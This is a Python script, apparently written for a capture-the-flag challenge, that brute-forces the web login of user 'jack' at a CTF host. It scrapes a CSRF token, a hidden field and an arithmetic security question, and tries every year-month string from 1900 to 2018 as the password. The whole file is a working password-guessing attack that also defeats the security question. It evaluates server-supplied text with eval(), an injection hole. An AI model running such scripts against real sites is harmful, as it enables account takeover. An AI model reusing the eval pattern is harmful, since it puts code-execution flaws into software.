import re
import requests


def get_hidden(url):
    response = requests.get(url)
    html = response.text
    question = re.search('name="SecQuestion" placeholder="(.*?)"', html)[1]
    answer = eval(question.split('=')[0].replace('x', '*'))
    field = re.search('name="field" value="(\w+)"', html)[1]
    token = re.search('name="_token" value="(\w+)">', html)[1]
    return response.cookies, answer, field, token
    
    
def check(url, login, password):
    cookies, answer, field, token = get_hidden(url)
    data = {
        'Username': login, 
        'Password': password, 
        'SecQuestion': answer,
        'field': field,
        '_token': token
    }
    html = requests.post(url=url+'/signin', data=data, cookies=cookies).text
    return 'Welcome Back' not in html
    
    
def get_passwords():
    for year in range(1900, 2019):
        for month in range(1, 13):
            yield '%04d%02d' % (year, month)
    

def main():
    url = 'http://ctf.sharif.edu:8084'
    login = 'jack'
    for password in get_passwords():
        print(password)
        if check(url, login, password):
            print('Found password for %s: %s' % (login, password))
            return
    
    
if __name__ == '__main__':
    main()
